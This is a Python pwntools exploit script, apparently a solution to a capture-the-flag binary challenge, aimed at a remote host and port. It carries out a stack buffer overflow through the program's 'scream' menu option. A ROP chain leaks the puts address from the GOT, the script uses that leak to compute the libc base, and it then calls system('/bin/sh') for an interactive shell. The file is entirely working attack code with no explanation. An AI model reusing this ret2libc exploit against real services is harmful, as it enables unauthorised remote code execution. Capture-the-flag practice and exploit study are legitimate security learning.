from pwn import *

# p = process("./chall")
p = remote("103.167.132.234", 27428)
# context.log_level = 'debug'
libc = ELF("./libc6_2.36-4_amd64.so")

pop_rsi = 0x0000000000401210
mov_rdi_rsi = 0x0000000000401205
puts_got = 0x403FB0
puts_plt = 0x0000000000401030
main = 0x00000000004016BA
ret = 0x0000000000401016


def drink():
    p.sendlineafter(b">> ", b"1")


def relax(msg):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b": ", msg)


def scream(msg):  # vuln
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b": ", msg)


def walk():
    p.sendlineafter(b">> ", b"4")


def quit():
    p.sendlineafter(b">> ", b"5")


payload = b"a" * 328
payload += p64(ret)
payload += p64(pop_rsi)
payload += p64(puts_got)
payload += p64(mov_rdi_rsi)
payload += p64(puts_plt)
payload += p64(main)

scream(payload)

p.recvuntil(b"..\n")
p.recvline()
leak_puts = p.recvuntil(b"\n")
leak_puts = leak_puts.replace(b"\n", b"")
log.info(f"Len leak: {len(leak_puts)}")
leak_puts = u64(leak_puts.ljust(8, b"\x00"))
print(hex(leak_puts))

libc.address = leak_puts - libc.sym["puts"]
str_bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

newpayload = b"a" * 328
newpayload += p64(pop_rsi)
newpayload += p64(str_bin_sh)
newpayload += p64(mov_rdi_rsi)
newpayload += p64(system)

scream(newpayload)
p.interactive()
